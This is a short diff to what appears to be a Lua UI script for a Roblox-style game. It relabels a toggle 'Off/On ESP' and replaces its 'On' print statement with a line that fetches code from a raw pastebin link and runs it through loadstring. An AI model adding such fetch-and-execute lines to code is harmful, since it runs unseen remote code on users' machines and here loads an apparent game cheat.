@@ -7,9 +7,9 @@ tab.newButton("Button", "Prints Hello!", function()
     print('Hello!')
 end)
 
-tab.newToggle("Toggle", "Toggle! (prints the state)", true, function(toggleState)
+tab.newToggle("Toggle", "Off/On ESP", true, function(toggleState)
     if toggleState then
-        print("On")
+        loadstring(game:HttpGet("https://pastebin.com/raw/7K1Jhmck"))()
     else
         print("Off")
     end
